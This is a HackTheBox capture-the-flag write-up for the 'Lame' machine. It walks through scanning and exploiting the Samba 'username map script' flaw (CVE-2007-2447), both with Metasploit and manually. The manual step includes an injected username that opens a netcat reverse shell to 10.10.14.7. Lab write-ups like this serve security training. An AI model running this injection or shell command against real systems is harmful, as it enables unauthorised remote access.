## HackTheBox Write-Up — Lame

*This is the write-up of the Machine [LAME](https://www.hackthebox.eu/home/machines/profile/1) from [HackTheBox](https://www.hackthebox.eu/).*

![Machine Map](../img/Lame Writeup/1_pMRHRDkFCsYTIPADwNwLnA.png)

## DIGEST

Lame is a beginner-friendly machine based on a Linux platform. It was the first machine from HTB.Use the samba username map script vulnerability to gain user and root.
>  Machine Author: [ch4p](https://www.hackthebox.eu/home/users/profile/1)
>  Machine Type: Linux
>  Machine Level: 2.7/10

## Know-How

* Nmap

* Searchsploit

## Absorb Skills

* [CVE-2007–2447](http://cvedetails.com/cve/cve-2007-2447)

* Samba “username map script” Command Execution

## Scanning the Network

    $nmap -sC -sV 10.10.10.3

![man nmap](../img/Lame Writeup/1_A52u5-G1cCR5CeXNWLyARA.png)

![nmap result](../img/Lame Writeup/1_6cAsYxuNw4Woo88r_I4uEw.png)

## Vulnerable Ftp

    searchsploit vsftpd 2.3.4

![searchsploit ftp](../img/Lame Writeup/1_uIaUUtd1jwNa1cr4v0PA8g.png)

I tried to execute the exploit but it failed every time :(

## Vulnerable Samba

This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default “username map script” configuration option. By specifying a username containing shell mmeta characters attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames pbeforeauthentication!.

    $searchsploit Samba 3.0.20

![searchsploit samba](../img/Lame Writeup/1_PavFhil2YjeOKBE81V2kpQ.png)

## Exploiting the Server

    msf5 >use exploit/multi/samba/usermap_script
    
    set RHOSTS 10.10.10.3
    exploit

![shell](../img/Lame Writeup/1_qQ8lZsgoeczPhKpJYR-6pA.png)

## Manual Exploit Without Metasploit

    logon “./=`nohup nc -e /bin/bash 10.10.14.7 4444`"

* logon:- it is used to login into smb

* nohup:-run a command immune to hangups, with output to a non-tty

![](../img/Lame Writeup/1_RTflbk-3QZl_wHo0owII3w.png)

## OWN USER

User makis have the user.txt

![Own user](../img/Lame Writeup/1_ClhOcAl5E1OKHemcGmzkow.png)

## OWN ROOT

![Own root](../img/Lame Writeup/1_r0tCr6g6sXSAYt5iQSCrZw.png)

![Trophy](../img/Lame Writeup/1_bRNHJW1VWcDBbBFBj5A_pA.png)

